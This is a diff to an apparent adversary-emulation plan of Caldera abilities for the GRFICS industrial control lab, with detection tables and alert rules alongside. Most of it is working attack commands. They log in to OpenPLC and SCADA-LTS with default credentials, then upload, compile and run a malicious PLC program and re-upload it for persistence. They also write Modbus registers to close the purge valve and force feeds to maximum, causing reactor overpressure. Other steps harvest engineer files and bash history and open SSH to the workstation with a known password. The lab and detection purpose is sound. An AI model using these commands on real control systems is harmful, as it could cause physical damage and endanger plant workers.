@@ -21,7 +21,7 @@
 | Simulation (Tank) | 192.168.95.14 | 502/tcp | Modbus TCP | Remote I/O - Pressure/Level | -- |
 | Simulation (Analyzer) | 192.168.95.15 | 502/tcp | Modbus TCP | Remote I/O - Composition (A/B/C) | -- |
 | PLC (OpenPLC) | 192.168.95.2 | 8080/tcp, 502/tcp | HTTP, Modbus | PLC Runtime + Web API | `openplc:openplc` |
-| EWS | 192.168.95.5 | 6080/tcp | HTTP (noVNC) | Engineering Workstation | -- |
+| EWS | 192.168.95.5 | 22/tcp, 6080/tcp | SSH, HTTP (noVNC) | Engineering Workstation | `engineer:plc123` (SSH and desktop) |
 | HMI (SCADA-LTS) | 192.168.90.107 | 8080/tcp | HTTP | Operator HMI | `admin:admin` |
 | Router/FW | 192.168.95.200 / 192.168.90.200 | 5000/tcp | HTTP | Firewall + Suricata IDS | `admin:password` |
 
@@ -58,6 +58,23 @@ Default setpoints: product_flow=13107, a_setpoint=30801, pressure_sp=55295, over
 4. **Caldera Agent Deployment**: A Sandcat or Manx agent can be deployed on Kali (pre-staged) and later on EWS or PLC after compromise. The Caldera server at 192.168.90.250 is reachable from both DMZ and (via router) ICS net.
 5. **Suricata IDS** on the router may generate alerts for known Modbus signatures but takes no blocking action by default.
 6. **OpenPLC Web API** allows program upload, start/stop, and configuration changes via HTTP with valid credentials.
+
+7. **GRFICS Caldera plugin alignment**: Abilities under `plugins/modbus` match the GRFICS-patched OpenPLC `webserver.py` routes and SCADA-LTS Spring Security behavior. Login abilities write session jars **`/tmp/plc_cookies.txt`** and **`/tmp/hmi_cookies.txt`** for reuse by dependent steps in the same operation.
+
+### GRFICS OpenPLC and SCADA-LTS HTTP semantics
+
+- **OpenPLC login**: `POST /login` with `username` and `password`; success is validated with `GET /dashboard` (grep for dashboard/OpenPLC/Programs/Running/Stopped), not by parsing mixed stdout from `curl -w`.
+- **Program listing / collection**: Stock GRFICS OpenPLC does **not** expose `GET /get-program-body`. Collection abilities use **`GET /programs`** (authenticated HTML) and parse `*.st` names for reconnaissance; raw `.st` download is operator/UI-centric.
+- **Program upload (two steps)**:
+  1. `POST /upload-program` with multipart field `file=@...` — the server stores `st_files/<random>.st` and returns HTML containing the assigned filename.
+  2. `POST /upload-program-action` with `prog_name`, `prog_descr`, `prog_file` (the server-assigned `*.st`), and `epoch_time`.
+  Follow-on compile/start abilities read the assigned ST name from **`/tmp/plc_last_st_file.txt`** (written by upload abilities).
+- **Compile / run / stop**: **`GET /compile-program?file=<name>`**, **`GET /start_plc`**, **`GET /stop_plc`** (underscores; not `start-plc`, `stop-plc`, or `compile-program?program_name=` alone).
+- **Program deletion**: **`GET /remove-program?id=<Prog_ID>`** — numeric IDs are parsed from `remove-program?id=` links on `/programs` (not a `POST` with `program_name=`).
+- **SCADA-LTS**: Prefer **`POST /j_spring_security_check`** with `j_username` / `j_password`, then **`POST /login.htm`** as fallback; validate the session with **`GET /watch_list.shtm`**. Discovery uses authenticated **`.shtm`** pages (for example `data_sources.shtm`, `watch_list.shtm`) instead of assuming root **`/api/*`** JSON endpoints exist on stock Scada-LTS.
+- **EWS file harvest**: The harvest ability requires **`/home/engineer`** on the agent host. Deploy Sandcat on the EWS (`192.168.95.5`, group `ews`) for a full filesystem harvest; when run from Kali the ability **skips** with an explicit message so the operation can continue.
+
+8. **SSH from Kali to EWS**: The attacker container (`192.168.90.6`) can reach **`engineer@192.168.95.5`** on **TCP/22** through the router. Abilities use **`sshpass`** for non-interactive password authentication (`plc123`). If `sshpass` is missing on the Kali agent, install it: `apt-get update && apt-get install -y sshpass` (lab image may already include it).
 
 ---
 
@@ -120,8 +137,7 @@ Create these ability YAML files and place them in `plugins/modbus/data/abilities
   executors:
   - platform: linux
     name: sh
-    command: >
-      nmap -sn 192.168.95.0/24 -oG - | grep "Up" | awk '{print $2}'
+    command: nmap -sn 192.168.95.0/24 -oG - | awk '/Up/{print $2}'
 ```
 
 **Ability: Modbus Read Device Info (already exists as `9360ba0d-...`)**
@@ -194,7 +210,7 @@ Uses the existing fact source targeting `192.168.95.10:502`.
     Write holding register 1 on Purge device (192.168.95.12) to 0,
     forcing the purge valve fully closed. This traps gas in the reactor,
     causing pressure to build.
-  tactic: inhibit-response-function
+  tactic: impact
   technique_id: T0831
   technique_name: Manipulation of Control
   executors:
@@ -220,7 +236,7 @@ Uses the existing fact source targeting `192.168.95.10:502`.
     Write holding register 1 on Feed 1 device (192.168.95.10) to 65535,
     forcing maximum inflow. Combined with purge closure, this rapidly
     increases reactor pressure.
-  tactic: impair-process-control
+  tactic: impact
   technique_id: T0831
   technique_name: Manipulation of Control
   executors:
@@ -248,7 +264,6 @@ description: |
   then manipulates valves to cause reactor overpressure.
 atomic_ordering:
 - a1b2c3d4-1111-1111-1111-000000000001  # Nmap ICS Subnet Discovery (Remote System Discovery : T0846)
-- 9360ba0d-46a3-47a1-bbe6-e6c875790500  # Read device info (existing)
 - a1b2c3d4-1111-1111-1111-000000000003  # Modbus - Enumerate All Process I/O (Point & Tag Identification : T0861)
 - a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
 - a1b2c3d4-1111-1111-1111-000000000004  # Modbus - Close Purge Valve (Manipulation of Control : T0831 )
@@ -307,7 +322,7 @@ Instead of slamming valves to extremes, write small incremental changes (e.g., r
 - id: a1b2c3d4-1111-1111-1111-000000000006
   name: Modbus - Gradual Purge Reduction
   description: Incrementally close purge valve to avoid sudden process alarms
-  tactic: impair-process-control
+  tactic: impact
   technique_id: T0831
   technique_name: Manipulation of Control
   executors:
@@ -370,8 +385,8 @@ This prevents the PLC's `pressure_override` function from activating (it trigger
 | **Initial Access** | 1 | Exploit Public-Facing Application | T0819 | Access HMI web interface at `192.168.90.107:8080` with `admin:admin` | Gain HMI access, observe process data |
 | **Discovery** | 2 | Remote System Discovery | T0846 | From HMI context, enumerate data sources pointing to `192.168.95.2` (PLC) | Identify PLC IP and Modbus configuration |
 | **Credential Access** | 3 | Default Credentials | T0812 | Attempt `openplc:openplc` on `http://192.168.95.2:8080` | Authenticate to OpenPLC web runtime |
-| **Collection** | 4 | Program Upload | T0843 | Download current program via OpenPLC web UI (`/programs` endpoint) | Obtain `326339.st` for analysis |
-| **Lateral Movement** | 5 | Program Upload | T0843 | Upload malicious ST file via OpenPLC web API | Replace legitimate control logic |
+| **Collection** | 4 | Program Upload | T0845 | Authenticated `GET /programs` — parse HTML for `*.st` names (no raw body GET) | Enumerate deployed ST programs for analysis |
+| **Lateral Movement** | 5 | Modify Program | T0889 | Two-step upload (`/upload-program` + `/upload-program-action`) then compile/start | Replace legitimate control logic |
 | **Inhibit Response** | 6 | Modify Program | T0889 | Malicious ST sets `run_bit := FALSE` or removes safety interlocks | PLC executes attacker logic |
 | **Impact** | 7 | Loss of Control | T0827 | Modified program opens all valves / ignores pressure override | Chemical process goes out of control |
 
@@ -388,24 +403,25 @@ This prevents the PLC's `pressure_override` function from activating (it trigger
 
 - id: b2c3d4e5-2222-2222-2222-000000000001
   name: OpenPLC - Default Credential Access
-  description: Login to OpenPLC web runtime with default credentials
-  tactic: credential-access
+  description: |
+    Login to OpenPLC web runtime with default credentials (GRFICS OpenPLC).
+    Uses HTTP status from curl -w (not tail on HTML). Session cookie jar /tmp/plc_cookies.txt.
+  tactic: lateral-movement
   technique_id: T0812
   technique_name: Default Credentials
   executors:
   - platform: linux
     name: sh
     command: >
-      curl -s -c /tmp/plc_cookies.txt
+      CODE=$(curl -s -o /tmp/plc_login_body.html -w "%{http_code}"
+      -c /tmp/plc_cookies.txt
       -d "username=openplc&password=openplc"
-      "http://192.168.95.2:8080/login"
-      -o /tmp/plc_login.html -w "%{http_code}" &&
-      HTTP=$(tail -c 3 /tmp/plc_login.html) &&
-      echo "HTTP_STATUS: $HTTP" &&
+      "http://192.168.95.2:8080/login") &&
+      echo "LOGIN_HTTP_CODE=$CODE" &&
       curl -s -b /tmp/plc_cookies.txt
       "http://192.168.95.2:8080/dashboard"
       -o /tmp/plc_dash.html &&
-      grep -qi "running\|dashboard\|programs" /tmp/plc_dash.html &&
+      grep -qi "dashboard\|OpenPLC\|Programs\|Running\|Stopped" /tmp/plc_dash.html &&
       echo "LOGIN_SUCCESS" || echo "LOGIN_FAILED"
     timeout: 60
 ```
@@ -417,19 +433,26 @@ This prevents the PLC's `pressure_override` function from activating (it trigger
 
 - id: b2c3d4e5-2222-2222-2222-000000000002
   name: OpenPLC - Download Running Program
-  description: Download the currently active Structured Text program from OpenPLC
+  description: |
+    GRFICS OpenPLC has no /get-program-body route. This ability enumerates programs
+    from /programs (authenticated) and saves the HTML for offline review. Raw .st
+    download is not exposed via a simple GET in stock OpenPLC; operators use the UI.
   tactic: collection
-  technique_id: T0843
+  technique_id: T0845
   technique_name: Program Upload
   executors:
   - platform: linux
     name: sh
     command: >
       curl -s -b /tmp/plc_cookies.txt
-      "http://192.168.95.2:8080/get-program-body?program_name=326339.st"
-      -o /tmp/original_program.st &&
-      echo "Downloaded program:" &&
-      head -20 /tmp/original_program.st
+      "http://192.168.95.2:8080/programs"
+      -o /tmp/programs_page.html &&
+      echo "=== .st files referenced on Programs page ===" &&
+      grep -oE '[0-9]+\.st' /tmp/programs_page.html | sort -u &&
+      echo "=== line count ===" &&
+      wc -l /tmp/programs_page.html &&
+      echo "PROGRAMS_PAGE_COLLECTED"
+    timeout: 60
 ```
 
 **Ability: Upload Malicious PLC Program**
@@ -440,9 +463,12 @@ This prevents the PLC's `pressure_override` function from activating (it trigger
 - id: b2c3d4e5-2222-2222-2222-000000000003
   name: OpenPLC - Upload Malicious Control Logic
   description: |
-    Write a malicious ST program using printf (no heredoc) and upload it.
-    Disables pressure override and forces dangerous valve positions.
-  tactic: impair-process-control
+    GRFICS flow: (1) POST multipart to /upload-program with field name "file" — server
+    saves st_files/<random>.st and returns a form; (2) POST application/x-www-form-urlencoded
+    to /upload-program-action with prog_name, prog_descr, prog_file, epoch_time;
+    (3) OpenPLC redirects toward compile-program?file=<name>. Writes /tmp/plc_last_st_file.txt
+    for the compile/start ability.
+  tactic: persistence
   technique_id: T0889
   technique_name: Modify Program
   executors:
@@ -469,13 +495,22 @@ This prevents the PLC's `pressure_override` function from activating (it trigger
       printf '    PROGRAM instance0 WITH task0 : main1;\n' >> /tmp/malicious.st &&
       printf '  END_RESOURCE\n' >> /tmp/malicious.st &&
       printf 'END_CONFIGURATION\n' >> /tmp/malicious.st &&
-      echo "ST file created:" && wc -l /tmp/malicious.st &&
-      curl -s -b /tmp/plc_cookies.txt
-      -F "file=@/tmp/malicious.st"
-      "http://192.168.95.2:8080/upload-program-action"
-      -o /tmp/upload_result.html -w "%{http_code}" &&
-      echo "PROGRAM_UPLOADED"
-    timeout: 60
+      echo "ST file bytes:" && wc -c /tmp/malicious.st &&
+      curl -s -b /tmp/plc_cookies.txt -F "file=@/tmp/malicious.st"
+      "http://192.168.95.2:8080/upload-program"
+      -o /tmp/plc_upload_form.html &&
+      FN=$(grep -oE '[0-9]+\.st' /tmp/plc_upload_form.html | head -1) &&
+      echo "PARSED_ST_FILENAME=$FN" &&
+      test -n "$FN" &&
+      curl -s -b /tmp/plc_cookies.txt -X POST "http://192.168.95.2:8080/upload-program-action"
+      -d "prog_name=malicious_lab"
+      -d "prog_descr=caldera_emulation"
+      -d "prog_file=$FN"
+      -d "epoch_time=$(date +%s)"
+      -o /tmp/plc_upload_action.html &&
+      echo "$FN" > /tmp/plc_last_st_file.txt &&
+      echo "UPLOAD_PROGRAM_ACTION_DONE"
+    timeout: 120
 ```
 
 **Ability: Compile and Start Malicious Program**
@@ -485,23 +520,31 @@ This prevents the PLC's `pressure_override` function from activating (it trigger
 
 - id: b2c3d4e5-2222-2222-2222-000000000004
   name: OpenPLC - Compile and Run Malicious Logic
-  description: Trigger compilation and start the uploaded malicious program on OpenPLC
-  tactic: impair-process-control
+  description: |
+    Uses GET /compile-program?file=<name> and GET /start_plc per GRFICS webserver.py.
+    Reads uploaded ST name from /tmp/plc_last_st_file.txt (written by upload ability).
+  tactic: persistence
   technique_id: T0889
   technique_name: Modify Program
   executors:
   - platform: linux
     name: sh
     command: >
+      FN=$(cat /tmp/plc_last_st_file.txt 2>/dev/null) &&
+      if [ -z "$FN" ]; then
+        FN=$(grep -oE '[0-9]+\.st' /tmp/plc_upload_form.html 2>/dev/null | head -1);
+      fi &&
+      echo "COMPILE_FILE=$FN" &&
+      test -n "$FN" &&
       curl -s -b /tmp/plc_cookies.txt
-      -X POST "http://192.168.95.2:8080/compile-program?program_name=malicious.st"
+      "http://192.168.95.2:8080/compile-program?file=$FN"
       -o /tmp/compile_result.html &&
-      sleep 5 &&
+      sleep 10 &&
       curl -s -b /tmp/plc_cookies.txt
-      -X POST "http://192.168.95.2:8080/start-plc"
+      "http://192.168.95.2:8080/start_plc"
       -o /tmp/start_result.html &&
-      echo "Malicious program compiled and started"
-    timeout: 120
+      echo "COMPILE_AND_START_TRIGGERED"
+    timeout: 180
 ```
 
 #### Step 3: Adversary Profile
@@ -519,7 +562,7 @@ description: |
 atomic_ordering:
 - a1b2c3d4-1111-1111-1111-000000000001  # Nmap ICS Subnet Discovery (Remote System Discovery : T0846)
 - b2c3d4e5-2222-2222-2222-000000000001  # OpenPLC - Default Credential Access (Default Credentials : T0812)
-- b2c3d4e5-2222-2222-2222-000000000002  # OpenPLC - Download Running Program (Program Upload : T0845)
+- b2c3d4e5-2222-2222-2222-000000000002  # OpenPLC - Programs page collection (Program Upload : T0845)
 - b2c3d4e5-2222-2222-2222-000000000003  # OpenPLC - Upload Malicious Control Logic (Modify Program : T0889)
 - b2c3d4e5-2222-2222-2222-000000000004  # OpenPLC - Compile and Run Malicious Logic (Modify Program : T0889)
 - a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
@@ -534,9 +577,9 @@ Same process as Chain 1 -- create operation via UI or API, select the `PLC Logic
 | Step | Log Source | What to Observe | Detection Data Component |
 |------|-----------|-----------------|-------------------------|
 | PLC web login | PLC auth.log (`shared_logs/plc/auth.log`) | HTTP auth from 192.168.90.6 to port 8080 | DC0067 (Logon Session Creation) |
-| Program download | PLC syslog/daemon.log | GET request to /get-program-body | DC0033 (Process Creation) |
-| Program upload | PLC syslog/daemon.log, PLC audit | POST to /upload-program with new .st file | DC0021 (File Modification), DC0034 (Process Metadata) |
-| Compile trigger | PLC syslog/daemon.log | `compile_program.sh` execution, matiec compiler invocation | DC0033 (Process Creation) |
+| Program page / recon | PLC syslog/daemon.log | GET /programs (HTML) listing .st names | DC0033 (Process Creation) |
+| Program upload | PLC syslog/daemon.log, PLC audit | POST /upload-program (multipart) then POST /upload-program-action | DC0021 (File Modification), DC0034 (Process Metadata) |
+| Compile trigger | PLC syslog/daemon.log | GET /compile-program?file=<random>.st, `compile_program.sh`, matiec | DC0033 (Process Creation) |
 | PLC restart | PLC daemon.log | OpenPLC runtime stop + start cycle | DC0033 (Process Termination / Creation) |
 | Process impact | Simulation alarms, Tank IR values | All feeds max, purge closed, pressure rising | DC0109 (Process/Event Alarm) |
 | Suricata | Router eve.json | HTTP traffic from DMZ host to PLC on port 8080 | DC0078 (Network Traffic Flow) |
@@ -553,7 +596,7 @@ This is harder to detect because the PLC program looks mostly unchanged and cont
 
 ### Escalation Path: Persistent Backdoor via Cron on PLC
 
-After uploading the malicious program, deploy a persistence mechanism on the PLC host:
+After uploading the malicious program, a realistic persistence pattern is to **re-run the same two-step upload** (`/upload-program` then `/upload-program-action`) and **`GET /compile-program?file=...`** on a schedule from a host that can reach the PLC web UI (for example a cron job on a compromised jump host). The plugin ships a **single-step re-upload** ability for lab use:
 
 ```yaml
 ---
@@ -561,8 +604,8 @@ After uploading the malicious program, deploy a persistence mechanism on the PLC
 - id: b2c3d4e5-2222-2222-2222-000000000005
   name: OpenPLC - Deploy Persistent Watchdog
   description: |
-    Create a cron job on the PLC that re-uploads and recompiles the
-    malicious program every 5 minutes, defeating any operator restore.
+    Re-uploads malicious.st via the real two-step OpenPLC flow (upload-program then
+    upload-program-action). Requires prior login and /tmp/malicious.st from upload ability.
   tactic: persistence
   technique_id: T0839
   technique_name: Module Firmware
@@ -570,10 +613,21 @@ After uploading the malicious program, deploy a persistence mechanism on the PLC
   - platform: linux
     name: sh
     command: >
-      curl -s -b /tmp/plc_cookies.txt
-      -X POST "http://192.168.95.2:8080/upload-program"
-      -F "file=@/tmp/malicious.st" &&
-      echo "Re-uploaded malicious program as persistence mechanism"
+      test -f /tmp/malicious.st || { echo "MISSING_/tmp/malicious.st"; exit 1; } &&
+      curl -s -b /tmp/plc_cookies.txt -F "file=@/tmp/malicious.st"
+      "http://192.168.95.2:8080/upload-program"
+      -o /tmp/plc_persist_form.html &&
+      FN=$(grep -oE '[0-9]+\.st' /tmp/plc_persist_form.html | head -1) &&
+      test -n "$FN" &&
+      curl -s -b /tmp/plc_cookies.txt -X POST "http://192.168.95.2:8080/upload-program-action"
+      -d "prog_name=persist_reup"
+      -d "prog_descr=watchdog"
+      -d "prog_file=$FN"
+      -d "epoch_time=$(date +%s)"
+      -o /dev/null &&
+      curl -s -b /tmp/plc_cookies.txt "http://192.168.95.2:8080/compile-program?file=$FN" -o /dev/null &&
+      echo "PERSIST_REUPLOAD_DONE"
+    timeout: 120
 ```
 
 ---
@@ -610,24 +664,35 @@ After uploading the malicious program, deploy a persistence mechanism on the PLC
 
 - id: c3d4e5f6-3333-3333-3333-000000000001
   name: SCADA-LTS - Default Credential Login
-  description: Login to SCADA-LTS HMI at root context path
-  tactic: credential-access
+  description: |
+    Spring Security first, then login.htm. Session /tmp/hmi_cookies.txt. Validates with watch_list.shtm.
+  tactic: lateral-movement
   technique_id: T0812
   technique_name: Default Credentials
   executors:
   - platform: linux
     name: sh
     command: >
-      curl -s -c /tmp/hmi_cookies.txt
+      rm -f /tmp/hmi_cookies.txt &&
+      curl -s -c /tmp/hmi_cookies.txt -L
+      -d "j_username=admin&j_password=admin"
+      "http://192.168.90.107:8080/j_spring_security_check"
+      -o /dev/null &&
+      curl -s -b /tmp/hmi_cookies.txt
+      "http://192.168.90.107:8080/watch_list.shtm"
+      -o /tmp/hmi_watch.html &&
+      ( grep -qiE "Scada|Watch|point|Data" /tmp/hmi_watch.html &&
+      echo "HMI_LOGIN_SUCCESS" ) || (
+      rm -f /tmp/hmi_cookies.txt &&
+      curl -s -c /tmp/hmi_cookies.txt -L
       -d "username=admin&password=admin"
       "http://192.168.90.107:8080/login.htm"
-      -o /tmp/hmi_login.html -w "%{http_code}" &&
-      echo "HTTP_STATUS:" &&
+      -o /dev/null &&
       curl -s -b /tmp/hmi_cookies.txt
-      "http://192.168.90.107:8080/data_point_details.shtm"
-      -o /tmp/hmi_check.html &&
-      grep -qi "data\|point\|scada\|watch" /tmp/hmi_check.html &&
-      echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED"
+      "http://192.168.90.107:8080/watch_list.shtm"
+      -o /tmp/hmi_watch2.html &&
+      ( grep -qiE "Scada|Watch|point|Data" /tmp/hmi_watch2.html &&
+      echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED" ) )
     timeout: 60
 ```
 
@@ -639,8 +704,8 @@ After uploading the malicious program, deploy a persistence mechanism on the PLC
 - id: c3d4e5f6-3333-3333-3333-000000000002
   name: SCADA-LTS - Enumerate Data Sources
   description: |
-    Use SCADA-LTS REST API to enumerate all configured data sources
-    and data points, revealing Modbus connections and register mappings
+    Uses authenticated HTML pages (data_sources.shtm) instead of non-existent JSON APIs.
+    Requires /tmp/hmi_cookies.txt from SCADA-LTS login.
   tactic: discovery
   technique_id: T0846
   technique_name: Remote System Discovery
@@ -649,12 +714,12 @@ After uploading the malicious program, deploy a persistence mechanism on the PLC
     name: sh
     command: >
       curl -s -b /tmp/hmi_cookies.txt
-      "http://192.168.90.107:8080/ScadaBR/api/datasources"
-      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
-      curl -s -b /tmp/hmi_cookies.txt
-      "http://192.168.90.107:8080/ScadaBR/api/datapoints"
-      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
-      echo "API enumeration attempted"
+      "http://192.168.90.107:8080/data_sources.shtm"
+      -o /tmp/hmi_data_sources.html &&
+      echo "=== Modbus / data source hints (grep) ===" &&
+      grep -oiE "192\.168\.[0-9]+\.[0-9]+|502|Modbus|slave|register" /tmp/hmi_data_sources.html | head -40 &&
+      echo "DATA_SOURCE_PAGE_COLLECTED"
+    timeout: 60
 ```
 
 **Ability: Simultaneous Process Attack + Sensor Spoofing**
@@ -667,7 +732,7 @@ After uploading the malicious program, deploy a persistence mechanism on the PLC
   description: |
     Close purge, open feeds, and spoof tank pressure simultaneously.
     Uses simple for loop instead of shell functions.
-  tactic: impair-process-control
+  tactic: impact
   technique_id: T0831
   technique_name: Manipulation of Control
   executors:
@@ -698,7 +763,7 @@ After uploading the malicious program, deploy a persistence mechanism on the PLC
     Use modbus_cli fuzz_r to randomly write all holding registers
     on Feed 1, Feed 2, and Purge devices, creating unpredictable
     process behavior that is difficult to diagnose.
-  tactic: impair-process-control
+  tactic: impact
   technique_id: T0831
   technique_name: Manipulation of Control
   executors:
@@ -727,7 +792,6 @@ description: |
   detecting the attack.
 atomic_ordering:
 - a1b2c3d4-1111-1111-1111-000000000001  # Network discovery
-- 9360ba0d-46a3-47a1-bbe6-e6c875790500  # Modbus device info
 - c3d4e5f6-3333-3333-3333-000000000001  # HMI login
 - c3d4e5f6-3333-3333-3333-000000000002  # Enumerate data sources
 - a1b2c3d4-1111-1111-1111-000000000003  # Read all process I/O
@@ -740,8 +804,8 @@ atomic_ordering:
 
 | Step | Log Source | What to Observe | Detection Data Component |
 |------|-----------|-----------------|-------------------------|
-| HMI login | HMI auth.log, Tomcat catalina.log (`shared_logs/hmi/catalina`) | POST to /login.htm from 192.168.90.6 | DC0067 (Logon Session Creation) |
-| API enumeration | Tomcat access logs | GET /api/datasources, /api/datapoints from attacker IP | DC0078 (Network Traffic Flow) |
+| HMI login | HMI auth.log, Tomcat catalina.log (`shared_logs/hmi/catalina`) | POST to /j_spring_security_check and/or /login.htm; GET /watch_list.shtm | DC0067 (Logon Session Creation) |
+| Data source discovery | Tomcat access logs | GET /data_sources.shtm (HTML) from attacker IP | DC0078 (Network Traffic Flow) |
 | Modbus writes to multiple devices | Router Suricata eve.json | Burst of FC=0x06 writes from 192.168.90.6 to .10,.11,.12,.14 | DC0082 (Network Traffic Content) |
 | Sensor spoofing on .14 | Simulation process alarms | Discrepancy between simulation internal pressure and Modbus-reported pressure | DC0109 (Process/Event Alarm) |
 | Purge valve manipulation | PLC app logs, simulation alarms | Purge valve position drops to 0 despite PLC commanding otherwise | DC0109 (Process/Event Alarm) |
@@ -833,7 +897,7 @@ Before the main attack, compromise the router to disable Suricata and firewall r
   description: |
     Write dangerous setpoint values to PLC registers.
     Reduced to 20 iterations to avoid Caldera timeout.
-  tactic: impair-process-control
+  tactic: execution
   technique_id: T0821
   technique_name: Modify Controller Tasking
   executors:
@@ -1019,7 +1083,7 @@ ls -la shared_logs/simulation/process_alarms/
 | **Stealth Level** | Medium (direct Modbus from attacker IP) | Low (HTTP traffic to PLC, program change logged) | High (masks attack via spoofed sensors) | Medium (writes to PLC from attacker IP) |
 | **Persistence** | None (must sustain writes) | High (malicious logic runs until replaced) | None | Medium (setpoints persist until overwritten) |
 | **Physical Impact** | Pressure excursion | Full process loss of control | Pressure excursion + operator blind | Setpoint corruption, intermittent faults |
-| **MITRE ICS Techniques** | T0819, T0846, T0842, T0888, T0861, T0801, T0831, T0879 | T0819, T0846, T0812, T0843, T0889, T0827 | T0812, T0846, T0852, T0888, T0801, T0856, T0831, T0829 | T0812, T0888, T0861, T0821, T0880, T0813 |
+| **MITRE ICS Techniques** | T0819, T0846, T0842, T0888, T0861, T0801, T0831, T0879 | T0819, T0846, T0812, T0845, T0889, T0827 | T0812, T0846, T0852, T0888, T0801, T0856, T0831, T0829 | T0812, T0888, T0861, T0821, T0880, T0813 |
 | **Detection Difficulty** | Easy (unauthorized Modbus source) | Medium (legitimate HTTP to PLC web) | Hard (looks like normal operator activity + sensors spoofed) | Medium (Modbus to PLC from unusual source) |
 
 ---
@@ -1036,9 +1100,11 @@ For each attack chain, the following detection rules should be developed:
 
 4. **Process Value Deviation**: Alert when pressure exceeds 3000 kPa or deviates more than 10% from 5-minute moving average. This catches the physical impact of all chains.
 
-5. **PLC Program Change**: Alert when the OpenPLC `/upload-program` or `/compile-program` endpoints are accessed. Any program change in a production environment should trigger investigation.
+5. **PLC Program Change**: Alert when the OpenPLC **`/upload-program`** + **`/upload-program-action`** sequence, **`GET /compile-program?file=`**, or **`GET /start_plc`** / **`GET /stop_plc`** occurs from an unexpected source. Any program change in a production environment should trigger investigation.
 
 6. **Sensor Value Discrepancy**: Cross-correlate Tank pressure readings with PLC input register values. If they diverge, sensor spoofing (Chain 3 escalation) is likely.
+
+7. **SSH to EWS from DMZ**: Alert on TCP/22 connections from `192.168.90.0/24` to `192.168.95.5`, especially **failed-then-successful** password authentication patterns and **SCP** file transfer in the same session family. Correlates with Chains **11–13** (SSH foothold, exfil, remote Sandcat deploy).
 
 ### Chain 5: Engineering Workstation Pivot with Lateral Tool Transfer
 
@@ -1078,6 +1144,8 @@ nohup ./splunkd -server $server -group ews -v &
 ```
 
 **Step 2: Create custom abilities**
+
+The **Harvest PLC Project Files** ability only lists `/home/engineer` when the Sandcat agent runs **on the EWS** (`192.168.95.5`). If the same adversary profile is run from the Kali group, that step prints a skip message and the operation continues—use group `ews` after deploying an agent on the EWS per Step 1.
 
 **Ability: Network Connection Enumeration from EWS**
 
@@ -1196,8 +1264,8 @@ nohup ./splunkd -server $server -group ews -v &
 - id: e5f6a7b8-5555-5555-5555-000000000005
   name: Harvest PLC Project Files from EWS
   description: |
-    Search the engineering workstation filesystem for PLC project
-    files (Structured Text, XML), configuration, and credentials.
+    Intended for an agent running ON the EWS (192.168.95.5) with /home/engineer.
+    If run from Kali, falls back to a non-fatal inventory so the operation continues.
   tactic: collection
   technique_id: T0893
   technique_name: Data from Local System
@@ -1205,15 +1273,18 @@ nohup ./splunkd -server $server -group ews -v &
   - platform: linux
     name: sh
     command: >
-      echo "=== ST files ===" &&
-      find /home/engineer -name "*.st" -exec echo {} \; 2>/dev/null &&
-      echo "=== XML project files ===" &&
-      find /home/engineer -name "*.xml" -exec echo {} \; 2>/dev/null &&
-      echo "=== Bash history ===" &&
-      cat /home/engineer/.bash_history 2>/dev/null | tail -20 &&
-      echo "=== Firefox bookmarks (URLs) ===" &&
-      strings /home/engineer/.mozilla/firefox/*/places.sqlite 2>/dev/null |
-      grep -oP 'https?://[^\s"]+' | sort -u | head -10
+      if [ -d /home/engineer ]; then
+        echo "=== ST files ===" &&
+        find /home/engineer -name "*.st" -print 2>/dev/null &&
+        echo "=== XML project files ===" &&
+        find /home/engineer -name "*.xml" -print 2>/dev/null &&
+        echo "=== Bash history (tail) ===" &&
+        tail -20 /home/engineer/.bash_history 2>/dev/null | head -20;
+      else
+        echo "SKIP: /home/engineer not on this host — deploy Sandcat on EWS for full harvest";
+      fi &&
+      echo "=== Done ==="
+    timeout: 60
 ```
 
 **Step 3: Adversary Profile**
@@ -1531,23 +1602,23 @@ Combine brute force writes with spoofed sensor values on Tank (.14) to mask the 
 
 ### Chain 7: SCADA HMI Deep Compromise -- View Manipulation + Alarm Tampering
 
-**Adversary Narrative**: An attacker targeting operator trust. After compromising the SCADA-LTS HMI with default credentials, they use the application's REST API to exfiltrate operational data, modify graphical views to display false-normal values, suppress alarm configurations, and ultimately blind operators while the process is being attacked through a separate Modbus channel.
+**Adversary Narrative**: An attacker targeting operator trust. After compromising the SCADA-LTS HMI with default credentials, they use **authenticated `.shtm` pages** (the paths that exist in stock GRFICS Scada-LTS) for reconnaissance and polling, because root **`/api/*` JSON endpoints are not assumed**. Operational data theft is modeled by repeated fetches of **`watch_list.shtm`**. Alarm and view tampering in a real deployment would use the web UI or captured POSTs; the plugin abilities **probe** alarm and view UIs for reachability rather than calling non-portable REST shapes.
 
-**Kill Chain**: HMI web login -> API-based recon -> Operational data theft -> Alarm setting modification -> View manipulation -> Simultaneous process attack -> Operator blindness
+**Kill Chain**: HMI web login (Spring Security) -> HTML-based recon -> Operational data theft (HTML polling) -> Alarm / view UI reachability -> Simultaneous process attack -> Operator blindness (narrative; combine with Chain 1/3 Modbus steps)
 
 #### Technique Mapping
 
 | Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
 |------|---------------|-------------|--------|----------------|--------------------------|
-| 1 | Default Credentials | T0812 | Lateral Movement | Login to SCADA-LTS with `admin:admin` | Full administrative HMI access |
-| 2 | Graphical User Interface | T0823 | Execution | Navigate SCADA-LTS web UI to identify views and data sources | Understand operator's visual display |
-| 3 | Execution through API | T0871 | Execution | Use SCADA-LTS REST API to enumerate data sources and points | Programmatic access to all process data |
-| 4 | Theft of Operational Information | T0882 | Impact | Export all process variable values, trends, and configurations | Full operational intelligence exfiltrated |
-| 5 | Automated Collection | T0802 | Collection | Script continuous API polling to build attacker-side historian | Real-time shadow copy of process data |
-| 6 | Modify Alarm Settings | T0838 | Inhibit Response | Raise alarm thresholds to extremes via SCADA-LTS API | Alarms will not trigger even during dangerous conditions |
-| 7 | Alarm Suppression | T0878 | Inhibit Response | Disable alarm notifications in SCADA-LTS event handlers | No alerts reach operators |
-| 8 | Manipulation of View | T0832 | Impact | Modify SCADA-LTS graphical view to show static "normal" values | Operators see false-normal display |
